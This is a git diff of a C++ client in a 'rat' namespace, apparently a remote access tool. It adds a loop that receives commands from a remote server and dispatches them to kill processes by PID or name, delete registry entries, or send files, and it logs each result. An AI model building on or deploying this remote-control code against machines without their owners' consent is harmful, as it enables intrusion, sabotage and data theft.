@@ -2,10 +2,7 @@
 
 rat::Client::Client(const std::string_view ip_address, int port)
 {
-}
 
-rat::Client::Client(std::string input)
-{
 }
 
 long long rat::Client::ConnectToServer(const std::string_view server_addr, int port)
@@ -47,28 +44,92 @@ long long rat::Client::ConnectToServer(const std::string_view server_addr, int p
 	if (i_result == SOCKET_ERROR) {
 		goto CONNECT_FAILED;
 	}
-	sock = TcpSocket(connect_socket);
-	return connect_socket;
+	sock_ = TcpSocket(connect_socket);
+	return 0;
 
 	CONNECT_FAILED:
+		if (sock_.GetSocket() != INVALID_SOCKET) {
+			sock_.Close();
+		}
+		connect_socket = INVALID_SOCKET;
 		#ifdef _WIN32
-			if (connect_socket != INVALID_SOCKET) {
-				closesocket(connect_socket);
-			}
 			WSACleanup();
 			return WSAGetLastError();
 		#elif __linux__
-			if (connect_socket != INVALID_SOCKET) {
-				close(connect_socket);
-			}
 			return i_result;
 		#endif //
 }
 
-void rat::Client::ReceiveOrder(std::string command, TcpSocket& sock)
+void rat::Client::ReceiveCommand()
 {
+	while(sock_.GetSocket() != INVALID_SOCKET)
+	{
+		int cmd_size = sock_.RecvInt();
+		if (sock_.Disconnected()){
+			continue;
+		}
+		std::vector<char> v = sock_.RecvBytes(cmd_size - 4);
+		if (v.size() != cmd_size - 4)
+		{
+			continue;
+		}
+		ClientCmd cmd(sock_, &*v.begin(), v.size());
+		if (cmd.execute())
+		{
+			if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillPid))
+			{
+				std::cout << "Successfully execute kill PID command from server with content: " << cmd.GetArgument()<< std::endl;
+			}
+			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
+			{
+				std::cout << "Successfully execute kill process name command from server with content: " << cmd.GetArgument()<< std::endl;
+			}
+			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
+			{
+				std::cout << "Successfully execute delete registry command from server with content: " << cmd.GetArgument()<< std::endl;
+			}
+			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
+			{
+				std::cout << "Successfully execute send file command from server with content: " << cmd.GetArgument()<< std::endl;
+			}
+
+		}
+		else
+		{
+			if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillPid))
+			{
+				std::cout << "Failed to execute kill PID command from server with content: " << cmd.GetArgument()<< std::endl;
+			}
+			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
+			{
+				std::cout << "Failed to execute kill process name command from server with content: " << cmd.GetArgument()<< std::endl;
+
+			}
+			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
+			{
+				std::cout << "Failed to execute delete registry command from server with content: " << cmd.GetArgument()<< std::endl;
+
+			}
+			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
+			{
+				std::cout << "Failed to execute send file command from server with content: " << cmd.GetArgument()<< std::endl;
+			}
+			else if (cmd.GetType() == -1)
+			{
+				std::cout << "Invalid command from the server: " << std::endl;
+			}
+		}
+	}
+	
 }
 
 void rat::Client::Clean()
 {
+	if (sock_.GetSocket() != INVALID_SOCKET) {
+		sock_.Close();
+	}
+	#ifdef _WIN32
+		WSACleanup();
+	#endif
+
 }
